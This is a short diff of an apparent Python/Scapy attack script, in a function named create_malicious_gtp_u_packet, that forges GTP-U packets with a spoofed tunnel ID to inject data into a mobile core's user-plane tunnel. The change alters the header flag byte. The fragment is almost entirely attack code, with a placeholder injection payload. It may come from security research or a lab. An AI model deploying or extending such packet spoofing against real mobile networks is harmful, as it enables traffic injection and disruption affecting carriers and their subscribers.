@@ -12,7 +12,7 @@ def create_malicious_gtp_u_packet(ue_ip, upf_ip, spoofed_teid):
  
 
     gtp_header = IP(src=ue_ip, dst=upf_ip) / UDP(sport=GTP_PORT, dport=GTP_PORT) / \
-                 Raw(load=struct.pack("!B3xI", 0x30, spoofed_teid))  
+                 Raw(load=struct.pack("!B3xI", 0x36, spoofed_teid))  
 
 
     gtp_payload = Raw(load="MALICIOUS DATA INJECTED INTO THE GTP-U TUNNEL")
